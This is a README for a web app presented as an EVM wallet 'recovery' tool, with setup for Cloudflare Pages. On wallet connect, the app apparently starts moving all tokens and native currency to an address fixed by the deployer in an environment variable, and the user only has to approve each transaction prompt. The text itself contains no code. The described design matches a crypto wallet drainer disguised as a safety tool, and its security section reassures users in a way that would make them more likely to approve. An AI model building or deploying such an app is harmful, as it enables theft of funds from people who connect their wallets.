# EVM Wallet Recovery

Non-custodial EVM recovery UI. Connect a wallet → scan balances → **auto-transfer all assets** on the connected network to a configured recovery address.

## Behavior

1. User connects (browser wallet or WalletConnect).
2. App scans supported networks (read-only).
3. If `VITE_RECOVERY_DESTINATION` is set, transfers **start automatically** for all non-zero assets on the **currently connected** chain (ERC-20 full balances, then native minus gas).
4. The user still **approves each transaction in their wallet**.

## Required env (Cloudflare Pages / `.env.local`)

```text
VITE_WALLETCONNECT_PROJECT_ID=your_walletconnect_project_id
VITE_RECOVERY_DESTINATION=0xYourSafeRecoveryAddress
```

Without `VITE_RECOVERY_DESTINATION`, connect + scan still work; the user can paste a destination and click **Transfer all now**.

## Run locally

```bash
npm install
npm run dev
```

## Cloudflare Pages

- Build: `npm run build`
- Output: `dist`
- Branch: `main`
- Env: `VITE_WALLETCONNECT_PROJECT_ID`, `VITE_RECOVERY_DESTINATION`

## Security

- No seed phrases or private keys are collected.
- Signing only happens inside the connected wallet.
- Verify destination and each wallet confirmation screen before approving.
